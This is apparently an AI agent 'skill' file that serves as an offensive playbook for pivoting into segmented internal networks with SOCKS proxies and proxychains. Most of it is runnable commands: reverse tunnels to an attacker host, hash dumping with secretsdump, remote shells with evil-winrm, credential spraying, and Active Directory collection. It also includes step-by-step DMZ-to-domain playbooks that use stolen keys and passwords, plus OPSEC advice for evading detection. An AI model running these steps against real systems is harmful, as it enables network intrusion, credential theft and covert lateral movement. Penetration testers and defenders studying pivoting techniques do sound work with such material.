# SOCKS Pivoting & Network Tunneling Skill

## Overview

SOCKS proxying with proxychains is the standard technique for routing attacker tooling through a compromised pivot host into segmented internal networks. Covers SOCKS protocol fundamentals, proxychains configuration and modes, per-tool usage, multi-hop chaining, DNS resolution, performance tuning, troubleshooting, and OPSEC.

**MITRE ATT&CK**: T1090 (Proxy), T1090.001 (Internal Proxy), T1090.002 (External Proxy), T1572 (Protocol Tunneling)

---

## 1. SOCKS Protocol Fundamentals

SOCKS (Socket Secure) operates at OSI Layer 5 and routes any TCP traffic (and UDP in SOCKS5) through a proxy server, unlike HTTP proxies which are protocol-specific.

| Feature | SOCKS4 | SOCKS4a | SOCKS5 |
|---------|--------|---------|--------|
| TCP | Yes | Yes | Yes |
| UDP | No | No | Yes |
| Authentication | No | No | Yes |
| Remote DNS | No | Yes | Yes |
| IPv6 | No | No | Yes |
| Use in pivoting | Legacy | Common | **Recommended** |

**SOCKS4**: TCP only, no auth, client must resolve hostname.  
**SOCKS4a**: Extension — proxy resolves hostname (remote DNS). Critical when internal DNS is needed.  
**SOCKS5**: TCP + UDP, multiple auth methods, IPv6, remote DNS, better error handling. Always prefer SOCKS5 for pivoting.

---

## 2. Proxychains Configuration

Proxychains intercepts network calls via `LD_PRELOAD` and routes them through configured SOCKS/HTTP proxies.

### Config File Locations

```bash
/etc/proxychains4.conf          # System-wide
~/.proxychains/proxychains.conf # Per-user
proxychains -f /path/to/custom.conf <cmd>  # Per-engagement (preferred)
```

### Complete Reference Config

```
# /etc/proxychains4.conf

# Chain mode — uncomment ONE:
strict_chain       # All proxies in order; any failure = connection fails
#dynamic_chain     # Skip dead proxies, use available ones in order
#random_chain      # Random selection (anonymity, not reliable for pivoting)
#round_robin_chain # Round-robin

# DNS — resolve hostnames through the proxy (required for internal names)
proxy_dns

# Fake DNS subnet (must not conflict with actual networks)
remote_dns_subnet 224

# Timeouts (milliseconds)
tcp_read_time_out 15000
tcp_connect_time_out 8000

# Suppress proxychains output (useful for scripting)
#quiet_mode

[ProxyList]
# Protocol   Address        Port   [User Password]
socks5       127.0.0.1      1080
# socks4     127.0.0.1      1080
# http       127.0.0.1      8080   username password
```

---

## 3. Proxychains Chain Modes

### strict_chain (default for engagements)

All proxies used in order. Any failure kills the connection. Predictable routing.

```
Client -> Proxy1 -> Proxy2 -> Target
```

```
strict_chain
[ProxyList]
socks5 127.0.0.1 1080    # Pivot 1 (must be alive)
socks5 127.0.0.1 1081    # Pivot 2 (must be alive)
```

### dynamic_chain

Dead proxies are skipped. At least one must be alive. Good for unstable tunnels or backup proxies.

```
Client -> Proxy1 -> Proxy3 -> Target   (Proxy2 was dead, skipped)
```

```
dynamic_chain
[ProxyList]
socks5 127.0.0.1 1080    # Primary
socks5 127.0.0.1 1081    # Backup
socks5 127.0.0.1 1082    # Backup
```

### random_chain

Selects random proxy per connection. Useful for anonymity, not practical for most pivoting.

```
random_chain
chain_len = 2
[ProxyList]
socks5 proxy1:1080
socks5 proxy2:1080
socks5 proxy3:1080
```

---

## 4. Setting Up a SOCKS Proxy Source

### SSH Dynamic Port Forwarding

```bash
ssh -D 1080 -N -f user@pivot_host
ss -tlnp | grep 1080   # Verify listening
```

### Chisel (recommended for non-SSH pivots)

```bash
# Attacker: start server
./chisel server -p 8080 --reverse

# Pivot host: connect back and open SOCKS
./chisel client attacker_ip:8080 R:socks
# SOCKS5 now on attacker at 127.0.0.1:1080
```

### Sliver C2

```bash
# In a Sliver session:
socks5 start -P 1080
# See skills/sliver-c2/SKILL.md for full Sliver pivoting workflow
```

### Metasploit

```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
```

### Cobalt Strike

```
beacon> socks 1080
# SOCKS proxy on team server at 127.0.0.1:1080
```

---

## 5. Using Proxychains with Common Tools

### Nmap

```bash
# ONLY TCP Connect scans (-sT) work through SOCKS
# SYN scans (-sS) require raw sockets — DO NOT USE
# Always add -Pn (ICMP does not traverse SOCKS)

# Basic TCP scan
proxychains nmap -sT -Pn -p 22,80,445,3389 10.10.10.0/24

# Service detection
proxychains nmap -sT -Pn -sV -p 80,443 10.10.10.80

# Top ports sweep
proxychains nmap -sT -Pn --top-ports 100 10.10.10.0/24

# Throttled scan (for unstable tunnels)
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24 \
    --max-retries 1 --min-rate 50 --max-rate 200 -T3

# Output to file
proxychains nmap -sT -Pn -p 1-1000 10.10.10.0/24 -oN internal_scan.txt
```

**Will NOT work through SOCKS**: `-sS` (SYN), `-sU` (UDP), `-O` (OS detect), `-sn` (ping sweep)

### NetExec / CrackMapExec

```bash
proxychains nxc smb 10.10.10.0/24
proxychains nxc smb 10.10.10.0/24 -u '' -p '' --shares
proxychains nxc smb 10.10.10.0/24 -u admin -p Password123 --sam
proxychains nxc winrm 10.10.10.0/24 -u admin -p Password123
proxychains nxc ldap 10.10.10.100 -u admin -p Password123
proxychains nxc mssql 10.10.10.0/24 -u sa -p Password123
```

### Impacket

```bash
proxychains impacket-psexec domain/admin:Password123@10.10.10.100
proxychains impacket-secretsdump domain/admin:Password123@10.10.10.100
proxychains impacket-wmiexec domain/admin:Password123@10.10.10.100
proxychains impacket-smbclient domain/admin:Password123@10.10.10.100
proxychains impacket-GetADUsers -all domain/admin:Password123@10.10.10.100
proxychains impacket-mssqlclient sa:Password123@10.10.10.50
```

### Evil-WinRM

```bash
proxychains evil-winrm -i 10.10.10.100 -u admin -p Password123
proxychains evil-winrm -i 10.10.10.100 -u admin -p Password123 -S   # SSL
```

### BloodHound Python

```bash
proxychains bloodhound-python -u admin -p Password123 \
    -d corp.local -dc dc01.corp.local -c all --zip
```

### curl / wget

```bash
proxychains curl http://10.10.10.80/
proxychains curl -k https://10.10.10.80/
curl --socks5-hostname 127.0.0.1:1080 http://internal.corp.local/  # native, no proxychains
proxychains wget http://10.10.10.80/file.txt -O /tmp/file.txt
```

### SSH Through Proxy

```bash
proxychains ssh admin@10.10.10.50
proxychains ssh -i key.pem admin@10.10.10.50
proxychains scp file.txt admin@10.10.10.50:/tmp/
```

### LDAP

```bash
proxychains ldapsearch -x -H ldap://10.10.10.100 \
    -D "admin@corp.local" -w Password123 -b "dc=corp,dc=local"
```

### RDP

```bash
proxychains xfreerdp /v:10.10.10.100 /u:admin /p:Password123
```

### Firefox

```bash
proxychains firefox &
# Or configure manually: Settings -> Network -> Manual SOCKS
# Host: 127.0.0.1  Port: 1080  SOCKS v5
# Check "Proxy DNS when using SOCKS v5"
```

**Will NOT work through SOCKS**: Responder LLMNR/NBT-NS poisoning (requires raw sockets), ARP scanning, traceroute.

---

## 6. DNS Resolution Through Proxychains

### How proxy_dns Works

```
1. App calls getaddrinfo("internal.corp.local")
2. Proxychains intercepts, creates fake IP (224.x.x.x) mapped to hostname
3. App connects to fake IP
4. Proxychains sends hostname to SOCKS5 proxy
5. SOCKS5 proxy resolves via pivot host's DNS
6. Connection made to resolved internal IP
```

### Troubleshooting DNS

```bash
# Verify proxy_dns is enabled
grep "^proxy_dns" /etc/proxychains4.conf

# Must be socks5, not socks4 (SOCKS4 has no remote DNS)
grep "socks" /etc/proxychains4.conf

# Test with IP vs hostname to isolate DNS
proxychains curl http://10.10.10.80/           # by IP — should work
proxychains curl http://internal.corp.local/   # by name — fails = DNS issue

# Fallback: add entries to /etc/hosts
echo "10.10.10.100 dc01.corp.local corp.local" | sudo tee -a /etc/hosts

# Or point resolv.conf at internal DNS (route queries through proxy)
echo "nameserver 10.10.10.2" | sudo tee /etc/resolv.conf
```

---

## 7. Multi-Hop Proxy Chaining

### Setup: Two Hops Deep

```
Attacker --> SOCKS1 (Pivot1:1080) --> SOCKS2 (Pivot2:1081) --> Target
```

```bash
# Hop 1: Pivot1 SOCKS
ssh -D 1080 -N -f user@172.16.1.10

# Hop 2: Through Pivot1, create SOCKS on Pivot2
proxychains ssh -D 1081 -N -f admin@10.10.10.50

# Alternative: SSH ProxyJump
ssh -J user@172.16.1.10 -D 1081 -N -f admin@10.10.10.50
```

### Per-Engagement Config for Chained Proxies

```bash
cat > /tmp/chain2.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080    # Hop 1 through Pivot1
socks5 127.0.0.1 1081    # Hop 2 through Pivot2
EOF

proxychains -f /tmp/chain2.conf nxc smb 10.10.30.0/24
```

Each additional hop multiplies latency. Keep chains short. For deeper segments, prefer Ligolo-ng.

---

## 8. Bypassing the Proxy for Local Addresses

```
# In proxychains config, localnet entries bypass the proxy:
localnet 127.0.0.0/255.0.0.0
localnet 192.168.1.0/255.255.255.0
localnet 10.0.0.5/255.255.255.255   # e.g., your C2 server
```

```bash
# Environment variable alternative (some tools respect these)
export ALL_PROXY=socks5://127.0.0.1:1080
export NO_PROXY=127.0.0.1,192.168.1.0/24
```

---

## 9. Performance Tuning

```bash
# 1. Tighten timeouts for faster scanning
# tcp_read_time_out 5000
# tcp_connect_time_out 3000

# 2. Limit nmap parallelism
proxychains nmap -sT -Pn --max-parallelism 10 -p 22,80,445 10.10.10.0/24

# 3. Targeted scans — never full port sweeps through a proxy
# Bad:  proxychains nmap -sT -Pn -p- 10.10.10.0/24
# Good: proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24

# 4. NetExec is faster than nmap for service-specific enum
proxychains nxc smb 10.10.10.0/24

# 5. Download large files on the pivot host directly, not through the proxy
```

---

## 10. Troubleshooting

### Connection refused / timeout

```bash
ss -tlnp | grep 1080                       # Verify proxy is listening
curl --socks5 127.0.0.1:1080 http://10.10.10.80/  # Test proxy directly
cat /etc/proxychains4.conf | grep -v "^#" | grep -v "^$"  # Check config syntax
# Remove quiet_mode and re-run to see chain output
```

### Tool hangs or very slow

```bash
# 1. Lower timeout values in config
# 2. Switch to dynamic_chain if proxies are flaky
# 3. Scan single host / few ports to confirm tunnel is alive
proxychains nmap -sT -Pn -p 445 10.10.10.100

# 4. Check tunnel is still alive
ssh -O check user@pivot
```

### libproxychains4 not found

```bash
find / -name "libproxychains*" 2>/dev/null
export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libproxychains.so.4
```

### Tool requires raw sockets

Raw socket ops cannot traverse SOCKS. Solutions:

1. Use TCP connect mode instead of SYN (`-sT` not `-sS`)
2. Add `-Pn` to skip ICMP
3. Switch to **Ligolo-ng** for a full TUN interface (supports raw sockets, ICMP, UDP)
4. Run the tool directly on the pivot host via SSH

---

## 11. OPSEC Considerations

### Detection Indicators

- **LD_PRELOAD injection** — proxychains uses `LD_PRELOAD`; EDR/eBPF hooks may flag unusual preloads
- **SOCKS5 handshake** is distinctive: client sends `0x05 0x01 0x00`, server replies `0x05 0x00`
- **Traffic origin** — all internal traffic appears to originate from the pivot host's IP; anomalous if that host is a web server that normally only talks to databases
- **Volume spikes** — port scanning through a pivot generates many connections from a single source
- **Long-lived SSH sessions** with `-D` flag visible in process listings on the pivot

### Minimizing Footprint

```bash
# 1. Throttle scans
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24 -T2 --max-rate 50

# 2. Spread scanning over time
for subnet in 10.10.10 10.10.20 10.10.30; do
    proxychains nmap -sT -Pn -p 80,445 ${subnet}.0/24
    sleep 300
done

# 3. Prefer NetExec for SMB/WinRM — fewer raw connections than nmap
# 4. Pivot through a user workstation, not a server — blends better
# 5. Use Ligolo-ng's TUN interface instead of LD_PRELOAD if stealth matters
```

---

## 12. tsocks (Legacy Alternative)

```bash
sudo apt install tsocks

cat > /etc/tsocks.conf << 'EOF'
local = 192.168.0.0/255.255.255.0
server = 127.0.0.1
server_type = 5
server_port = 1080
EOF

tsocks nmap -sT -Pn 10.10.10.0/24
tsocks ssh admin@10.10.10.50
```

Prefer proxychains-ng over tsocks — it is actively maintained with better SOCKS5 support, `dynamic_chain` mode, and proxy DNS.

---

## 13. Installing proxychains-ng

```bash
sudo apt install proxychains4

# Or build from source
git clone https://github.com/rofl0r/proxychains-ng.git
cd proxychains-ng
./configure --prefix=/usr --sysconfdir=/etc
make && sudo make install
```

---

## 14. Real-World Engagement Playbooks

### Single Pivot: DMZ → Internal AD

```bash
# 1. Establish SOCKS via compromised DMZ host
ssh -D 1080 -N -f -i stolen_key www-data@172.16.1.10

# 2. Discover internal subnets (read /proc/net/route or netstat on pivot)
# Found: 10.10.10.0/24 (users), 10.10.20.0/24 (servers)

# 3. Quick SMB sweep
proxychains nxc smb 10.10.10.0/24 --timeout 5
proxychains nxc smb 10.10.20.0/24 --timeout 5

# 4. Test creds found in web app DB
proxychains nxc smb 10.10.20.100 -u admin -p 'DbP@ssw0rd'

# 5. Dump hashes
proxychains impacket-secretsdump corp.local/admin:DbP@ssw0rd@10.10.20.100

# 6. Access shares
proxychains impacket-smbclient corp.local/admin:DbP@ssw0rd@10.10.20.100

# 7. WinRM for interactive shell
proxychains evil-winrm -i 10.10.20.100 -u admin -p 'DbP@ssw0rd'

# 8. BloodHound collection
proxychains bloodhound-python -u admin -p 'DbP@ssw0rd' \
    -d corp.local -dc dc01.corp.local -c all --zip
```

### Double Pivot: Attacker → DMZ → Internal → Management VLAN

```bash
# Pivot 1: DMZ → Internal
ssh -D 1080 -N -f user@dmz-server

# Pivot 2: Internal → Management (routed through Pivot 1)
proxychains ssh -D 1081 -N -f admin@internal-server

# Reach Management VLAN through double hop
cat > /tmp/mgmt.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1081
EOF

proxychains -f /tmp/mgmt.conf nxc smb 10.10.30.0/24
```

---

## Summary

1. Use **SOCKS5** over SOCKS4/4a — remote DNS + auth support
2. Always `-Pn` with nmap — no ICMP through SOCKS
3. Only **TCP Connect scans** (`-sT`) — SYN scans require raw sockets
4. Enable `proxy_dns` for internal hostname resolution
5. Use `strict_chain` for predictable engagement routing
6. Use **per-engagement config files** (`-f`) to keep configurations isolated
7. Latency multiplies with each hop — keep chains short
8. Switch to **Ligolo-ng** when raw sockets, UDP, or ICMP are needed
9. Clean up SOCKS processes after the engagement
10. Monitor tunnel stability — be prepared to re-establish if SSH drops
